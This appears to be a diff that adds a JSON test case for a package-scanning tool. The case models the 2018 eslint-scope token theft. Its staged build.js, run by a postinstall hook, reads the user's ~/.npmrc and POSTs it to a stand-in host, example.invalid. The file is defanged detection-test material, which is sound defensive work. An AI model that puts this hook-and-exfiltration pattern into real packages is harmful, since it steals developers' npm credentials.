@@ -1,0 +1,57 @@
+{
+  "id": "npm-eslint-scope-npmrc-exfil",
+  "title": "Postinstall build step reads ~/.npmrc and beacons the npm token out",
+  "ecosystem": "npm",
+  "verdict": "malicious",
+  "threatClass": "credential-steal",
+  "source": "real-sanitized",
+  "provenance": "eslint-scope 3.7.2 (July 2018) account-takeover: the published package added a postinstall build step that read the npm auth token from the user's ~/.npmrc and POSTed it to a remote host. Defanged: exfil host replaced with example.invalid, no real token present.",
+  "intent": "Models the lifecycle-hook + read-local-credential-file + network-exfil shape. Drydock should catch this via the postinstall lifecycle hook and the network-capable code path, even though reading the token from a file on disk (rather than process.env) is NOT modeled by the deterministic credential rule — that read is the residual gap this case documents. Safe: host is example.invalid and the .npmrc read is a literal path with no secret.",
+  "expectMinRisk": "high",
+  "expectAnyRule": [],
+  "previousPackageJson": { "name": "eslint-scope", "version": "3.7.1" },
+  "stagedPackageJson": {
+    "name": "eslint-scope",
+    "version": "3.7.2",
+    "scripts": { "postinstall": "node build.js" }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 46,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"eslint-scope\",\"version\":\"3.7.1\"}"
+    },
+    {
+      "path": "lib/index.js",
+      "size": 40,
+      "sha256": "lib-index-js",
+      "flags": [],
+      "textSample": "module.exports = require('./scope-manager');\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 92,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"eslint-scope\",\"version\":\"3.7.2\",\"scripts\":{\"postinstall\":\"node build.js\"}}"
+    },
+    {
+      "path": "lib/index.js",
+      "size": 40,
+      "sha256": "lib-index-js",
+      "flags": [],
+      "textSample": "module.exports = require('./scope-manager');\n"
+    },
+    {
+      "path": "build.js",
+      "size": 240,
+      "sha256": "build-js",
+      "flags": [],
+      "textSample": "const fs = require('fs');\nconst os = require('os');\nconst https = require('https');\n// Read the npm auth credential from the user's home rc file and beacon it out.\nconst rc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\nconst req = https.request('https://example.invalid/upload', { method: 'POST' });\nreq.end(rc);\n"
+    }
+  ]
+}
